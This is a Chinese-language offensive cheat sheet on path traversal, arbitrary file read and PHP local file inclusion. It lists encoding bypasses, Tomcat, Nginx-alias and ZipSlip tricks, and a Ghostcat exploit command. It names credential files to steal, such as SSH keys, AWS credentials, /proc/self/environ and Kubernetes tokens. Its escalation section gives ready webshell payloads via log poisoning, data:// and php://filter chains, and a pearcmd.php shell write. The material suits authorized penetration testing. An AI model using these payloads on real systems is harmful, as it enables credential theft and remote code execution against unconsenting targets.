## 一、漏洞确认 

- **是穿越、任意读还是 LFI**:
  - 穿越:入口拼固定前缀(`pages/{page}.php`)→ `../` 逃目录
  - 任意读:接收绝对路径或裸文件名(`?file=/etc/passwd`、`download?filename=report.pdf` 改 `../../etc/passwd`)→ 不用 `../` 也能读
  - LFI(PHP):`include`/`require` 接收输入 → 文件**当 PHP 执行**,不止读
- **回显程度**:全回显(内容直返 body)/ 报错(路径·不存在报错含信息)/ blind(只状态码或差异,盲读走 oracle 或 OOB)
- **能力边界**:接受绝对路径?接受 `php://` wrapper?Linux 还是 Windows(试 `../` 和 `..\..\`)?
- **后端架构(决定读哪些文件)**:Java(JSESSIONID cookie、`.jsp`/`.do`、`/WEB-INF/`)/ PHP(PHPSESSID、`.php`、`X-Powered-By: PHP`)/ Node(`connect.sid`、Express 头、`package.json`)/ Python(Django `csrftoken` cookie、Flask);OS 从路径大小写敏感(Windows 不敏感)、反斜杠试探、报错路径格式判

## 二、绕过 | 按校验类型对症

- **拦 `../`**:编码变体——`%2e%2e%2f`、双编码 `%252e%252e%252f`(服务端解一次、过滤在解之前)、Unicode `%c0%af`(`/` 过长 UTF-8)`%c1%9c`(`\`)、全角 `／`(`%ef%bc%8f`)
- **过滤 strip `../` 一次**:冗余 `....//`、`..././`(strip 后还剩 `../`)
- **拦编码**:混合 `..%2F..%2F`、Windows 反斜 `..%5c`
- **截后缀**(服务端硬加 `.php`/`.html`):null byte `%00`(PHP<5.3.4);路径长度截断(255+ 个 `.` 或 `/./` 填充,PHP 历史限制)
- **Windows `FindFirstFile` 通配**:`<<` 匹配任意扩展(`php<<`→`php5`/`phtml`)、`>` 单字符(`shel>`→`shell.php`);UNC `\\127.0.0.1\C$\Windows\win.ini`
- **Tomcat `/..;/`**:WAF 看 `/app/..;/manager/html` 当 `/app/` 下放行,Tomcat 规范化 `..;`→`..` 穿越;`/..;/..;/WEB-INF/web.xml`
- **AJP Ghostcat(CVE-2020-1938)**:Tomcat AJP(8009)外露(`secretRequired` 未设,Tomcat<9.0.31)→ `ajpShooter.py http://target:8009 /WEB-INF/web.xml read` 任意文件读;`eval` 模式还能包含攻击者 JSP 执行
- **Nginx alias 缺斜杠**:`location /assets { alias /data/; }`(location 缺尾斜杠)→ `/assets../etc/passwd`(alias 替 `/assets`→`/data/`,余 `../` 穿越)。站上有 `/static` `/assets` `/img` 就请求 `/static../etc/passwd`,不必先看见配置
- **双重解码**:中间件解一次 + 静态中间件再解一次(`%252e`→`%2e`→`.`)
- **Node**:`path.join()` 前先 URL 解码 → `..%2f` 直达;`express.static` 双解码;`url.parse()` 不规范化 `../`(混用 `new URL()` 漏)
- **ZipSlip**(上传解压穿越):Java `ZipEntry.getName()` 不清洗 `../` → 解压写 `../../etc/cron.d/x` 或 `../../../webapps/ROOT/shell.jsp`;tar 同理;Node `yauzl`/`adm-zip` 也不清洗

## 三、漏洞证明 | 读什么,凭证优先

### 文件读(主轴,凭证优先)

- **证入口成立**:`/etc/passwd`、`win.ini` 这类常规靶标早被 WAF ban,换小众不被 ban 的——Linux `/etc/hostname` `/etc/issue` `/proc/self/cgroup` `/proc/version` `/proc/self/cmdline`;Windows `C:\Windows\System32\drivers\etc\hosts`。读到任意一个 = 入口成立。
- **按后端框架找配置/凭证**(思路:配置文件藏 DB 串·API key,按框架找其配置位置;通用配置文件名不写死,反直觉/受保护目录才写死):
  - 方向:Web 框架配置(Python settings/config、Node `.env`+config、PHP cms 配置)、应用 env 文件、Web 服务器配置(nginx/apache `sites-enabled`)
  - **Java(受保护目录,反直觉写死)**:`/WEB-INF/web.xml`(servlet 映射/安全约束)、`/WEB-INF/classes/application.properties` 或 `application.yml`(Spring DB 串·API key)、`/WEB-INF/lib/*.jar`(下反编译)、`/META-INF/context.xml`
  - **用户家目录凭证(反直觉锚点,USER 名占位,先从 `/etc/passwd` 或报错拿)**:`~/.ssh/id_rsa` `~/.ssh/authorized_keys` `~/.aws/credentials` `~/.bash_history` `~/.gitconfig`、`/var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}`(k8s SA token,云原生)
- **进程环境(反直觉,优先读)**:`/proc/self/environ`——环境变量常被业务注入 DB 串·API key·云钥,比读配置文件更全;`/proc/self/cmdline` 看启动参数
- **读源码找硬编码(PHP 特殊)**:`php://filter/convert.base64-encode/resource=config.php`——PHP 源码 `<?php` 不回显,base64 编码后回显,解 base64 找硬编码密码/盐/key;变体 `read=string.rot13` `convert.iconv.UTF-8.UTF-16`、链式 `|convert.base64-encode`
- **Node 静态根当仓库**:`/package.json` 能直 GET 说明静态中间件指仓库根(不是 public)→ 顺带读 `/config/*.yml` `.env`(node-config 环境名:default/production/online),不必 `../`
- **静态桶 .NET 发布物**(皮):对象存储/静态桶挂旧 .NET 发布物,aspx 源码能 GET → `web.config` 456 是 WAF 拦不是没文件,读同目录 `App.config` `Web.Release.config` `*.exe.config` `bin/*.dll.config` `bin/*.pdb`
- **公网 VS Code 系**(皮):`/login` 无墙 → `/remote-resource?path=/proc/self/status` 看 Uid,再 `path=/proc/self/environ`;environ 里 SSH 私钥常 base64 PEM,解开假钥对照连环境里 Git 主机
- **盲读 oracle**(无回显):synacktiv `php_filter_chains_oracle_exploit`(iconv+dechunk 逐字节差异判内容)

### 危害升级 LFI→RCE(次,PHP `include` 才行;自己写 python PoC,这里只给路径)

> 普通文件读到此为止(读到凭证 = 证到危害)。只有入口是 PHP `include`/`require`(文件当 PHP 执行)才走 RCE 升级,真执行风险高,按站。

- **log poisoning**:UA 注 `<?php system($_GET['c']);?>` → include `/var/log/apache2/access.log`;SSH 用户名注 → include `/var/log/auth.log`;SMTP subject 注 → include `/var/log/mail.log`
- **`/proc/self/environ` 投毒**:UA 反射进 environ → include `/proc/self/environ`(CGI/FastCGI)
- **PHP session 投毒**:session 变量可控注 PHP → include `/tmp/sess_PHPSESSID`(或 `/var/lib/php/sessions/sess_PHPSESSID`)
- **wrapper**:`php://input`(POST body 注 PHP,需 `allow_url_include=On`)、`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==`、`expect://id`(需 expect 扩展)、`phar://uploaded.phar/test.php`(反序列化 POP 链,phar 伪装 JPG)、`zip://uploaded.zip%23shell.php`
- **php_filter_chain_generator**(synacktiv,无需写路径/日志,纯 filter 链写任意字节→RCE):`python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`
- **iconv CVE-2024-2961**(glibc<2.39,filter 链堆溢出→RCE,cfreal/cnext-exploits)
- **pearcmd.php**(Docker PHP 常见 `register_argc_argv=On`):`?file=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php`
- **`/proc/self/fd/0-255` 暴力** + **phpinfo() 竞争**(multipart 上传到 phpinfo 泄露 tmp 路径 → include)

## 四、误报

- 前端 SPA 路由(path 参前端处理,不到后端文件)
- CDN/静态服务规范化返 200 但是 CDN 缓存非源站文件
- 软链/容器只读读到但无害(读到 `/etc/passwd` 是容器模板)
- 读到占位/默认文件(`.env` 是 `ENTER_YOUR_*` 占位)
- 现代 PHP/Node 拒 null byte(PHP≥5.3.4 / Node≥14)
- WAF 软拦返 200(空 body 或默认页)
- IIS 短名(`~1`)只露文件**存在**非内容(信息级,不当穿越成)
- 只能列静态目录本来就公开的 css/图(Nginx alias 两边都有斜杠,规范化挡住)
- 读到 `package.json` 但 config 404(静态根只出 public,不是仓库根)
